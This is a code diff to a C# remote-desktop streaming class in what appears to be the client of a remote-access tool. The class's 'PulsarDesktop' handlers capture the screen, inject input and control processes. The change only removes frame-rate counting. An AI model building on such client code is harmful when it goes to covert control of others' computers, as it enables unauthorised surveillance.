@@ -27,7 +27,6 @@ namespace Pulsar.Client.Messages
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
 
-
         private readonly ImageHandler ImageHandler = new ImageHandler("PulsarDesktop");
         private readonly InputHandler InputHandler = new InputHandler("PulsarDesktop");
         private readonly ProcessController ProcessHandler = new ProcessController("PulsarDesktop");
@@ -36,10 +35,6 @@ namespace Pulsar.Client.Messages
         private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
         private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
         private int _pendingFrameRequests = 0;
-
-        //fps counting
-        private int _framesSent = 0;
-        private float _currentFps = 0f;
 
         // max buffer size to prevent memory issues
         private const int MAX_BUFFER_SIZE = 10;
@@ -182,12 +177,9 @@ namespace Pulsar.Client.Messages
                     if (frameData != null)
                     {
                         _frameBuffer.Enqueue(frameData);
-                        _framesSent++;
 
                         if (_stopwatch.ElapsedMilliseconds >= 1000)
                         {
-                            _currentFps = _framesSent / (_stopwatch.ElapsedMilliseconds / 1000f);
-                            _framesSent = 0;
                             _stopwatch.Restart();
                         }
                     }
@@ -258,8 +250,7 @@ namespace Pulsar.Client.Messages
                     Monitor = _streamCodec.Monitor,
                     Resolution = _streamCodec.Resolution,
                     Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
-                    IsLastRequestedFrame = isLastRequestedFrame,
-                    Fps = _currentFps
+                    IsLastRequestedFrame = isLastRequestedFrame
                 });
             }
             catch (Exception)
